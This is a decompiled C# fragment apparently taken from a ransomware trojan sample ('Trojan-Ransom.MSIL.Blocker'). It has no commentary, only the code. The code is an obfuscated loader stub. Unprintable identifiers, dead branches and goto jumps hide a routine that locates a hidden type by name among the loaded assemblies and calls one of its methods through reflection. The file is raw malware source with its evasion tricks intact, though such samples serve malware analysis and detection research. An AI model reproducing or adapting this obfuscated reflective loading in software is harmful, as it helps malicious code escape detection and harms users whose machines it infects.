// Decompiled with JetBrains decompiler
// Type: .
// Assembly: PL1041000058xls, Version=1.0.2.43, Culture=neutral, PublicKeyToken=null
// MVID: FDCAECB1-662B-4C0C-9694-AA9844E5A22D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-50a95734e8a83b187ac1804a2dc2ae3a9e64fddde06b370454f26d7b9d7ffadc.exe

using System;
using System.Reflection;
using System.Threading;

namespace \u0001
{
  internal class \u0002
  {
    static int \u0001(string _param0)
    {
      int num1;
      foreach (Assembly assembly in Thread.GetDomain().GetAssemblies())
      {
        if (assembly.FullName == _param0)
        {
          foreach (Type exportedType in assembly.GetExportedTypes())
          {
            MethodInfo[] methods;
            int index;
            if (true)
            {
              if (exportedType.FullName == "Iuagagsbgjolx.Cnwsspglnxnobme")
              {
                if (true)
                {
                  methods = exportedType.GetMethods();
                  if (true)
                  {
                    index = 0;
                    goto label_15;
                  }
                  else
                    continue;
                }
                else
                  goto label_10;
              }
              else
                goto label_17;
            }
            else
              goto label_9;
label_8:
            MethodInfo methodInfo;
            bool flag = methodInfo.Name == "Aaeqwckdowxdmdpal";
label_9:
            int num2;
            if (!flag)
            {
              if (true)
              {
                num2 = index;
                if (true)
                {
                  index = num2 + 1;
                  goto label_15;
                }
                else
                  goto label_16;
              }
              else
                continue;
            }
label_10:
            if (true)
            {
              num1 = Convert.ToInt32((object) (Environment.SpecialFolder) methodInfo.Invoke((object) null, (object[]) null));
              if (false)
                break;
              goto label_23;
            }
            else
              goto label_8;
label_15:
            num2 = index;
label_16:
            int length = methods.Length;
            if (num2 < length)
            {
              methodInfo = methods[index];
              goto label_8;
            }
label_17:;
          }
        }
      }
      num1 = 1;
label_23:
      return num1;
    }
  }
}
